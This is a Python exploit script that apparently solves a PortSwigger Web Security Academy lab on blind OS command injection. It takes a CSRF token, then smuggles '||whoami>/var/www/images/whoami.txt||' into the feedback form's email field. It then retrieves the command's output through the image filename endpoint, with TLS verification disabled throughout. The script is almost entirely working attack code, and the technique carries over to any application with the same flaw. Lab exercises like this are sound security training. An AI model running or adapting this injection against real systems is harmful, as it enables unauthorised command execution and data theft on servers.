import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]

def main():
    host = "https://0a97009f030fea9680dc80c900f9004f.web-security-academy.net/"
    feedback_url = f"{host}/feedback/"
    image_url = f"{host}/image?filename="
    filename = "whoami.txt"
    filepath = "/var/www/images/"
    ou = "||"
    redirect = ">"
    exploit = f"{ou}whoami{redirect}{filepath}{filename}{ou}"

    session = requests.Session()
    params = {
        "csrf": get_csrf_token(session, feedback_url),
        "name": "test",
        "email": f"{exploit}",
        "subject": "test",
        "message": "test"
    }

    resp = session.post(feedback_url + "submit", data=params, verify=False, allow_redirects=True)
    if resp.status_code == 200:
        print("Exploit sent successfully.")
        print("User is :", session.get(image_url + filename, verify=False).text.strip())
        print("Koated !!")

    else:
        print(f"Exploit failed with status code {resp.status_code}")
        print("ya siks")

if __name__ == "__main__":
    main()

